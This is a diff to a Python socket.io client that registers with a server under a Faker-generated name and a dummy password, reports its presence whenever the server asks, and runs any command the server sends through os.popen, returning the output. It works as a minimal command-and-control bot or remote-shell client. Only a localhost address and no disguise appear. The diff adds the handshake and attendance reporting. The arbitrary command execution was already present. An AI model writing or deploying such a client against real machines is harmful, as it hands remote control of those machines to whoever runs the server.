@@ -9,6 +9,11 @@ fake = Faker()
 clientsio = socketio.Client()
 start_timer = True
 
+payload = {
+    'client_ID': fake.name(),
+    'password': 'Does it matter ?',
+}
+
 
 # Defining Event Handlers
 @clientsio.event
@@ -19,6 +24,8 @@ def message(data):
 @clientsio.event
 def connect():
     print("I'm connected!")
+    payload['client_Session_ID'] = clientsio.sid
+    clientsio.emit('first_handshake', payload)
 
 
 @clientsio.event
@@ -40,17 +47,14 @@ def receive_command(json):
 def handle_command_from_server(command):
 
     output = os.popen(command).read()
-
-    # achieved_output = 'all things are good here !'
     clientsio.emit('output_from_client', output)
+
+
+@clientsio.on('client_please_report')
+def register_to_server_for_realtime_attendance(message):
+    clientsio.emit('realtime_attendance', payload)
 
 
 if __name__ == "__main__":
     clientsio.connect('http://localhost:5000')
-    payload = {
-        'client_ID': fake.name(),
-        'password': 'Does it matter ?',
-        'client_Session_ID': str(clientsio.sid)
-    }
-    clientsio.emit('first_handshake', payload)
     clientsio.wait()
